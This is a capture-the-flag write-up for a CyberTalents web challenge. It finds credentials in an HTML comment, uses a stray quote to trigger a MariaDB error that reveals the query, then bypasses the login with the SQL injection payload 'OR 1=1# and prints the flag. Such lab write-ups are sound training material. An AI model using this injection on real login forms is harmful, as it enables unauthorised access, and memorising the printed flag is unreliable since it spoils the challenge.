# Solve Easy access
### https://cybertalents.com/challenges/web/easy-access

![alt text](images/image-1.png)

in The source code we found `<!---user:bob,pass:password-->`


### Login with user:bob pass:password
![alt text](images/image.png)

Only admin can see the flag 

### Try to Cause error in the login 
##### Payload 
`username:'test Password:test`

Error: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'test' AND password = '098f6bcd4621d373cade4e832627b4f6'' at line 1

Note the DB is `MariaDB`

#### SQL query structure from error 
```sql
select users_table from user_database where user='username' AND password = md5_hashed_password
```

### SQLI 
We need to inject in the username because the password parsed as md5 hash
payload `username:'OR 1=1# Password:test`

Flag is `flag{!njection_3v3ry_wh3r3}`


>Find More on ==> github.com/MedhatHassan 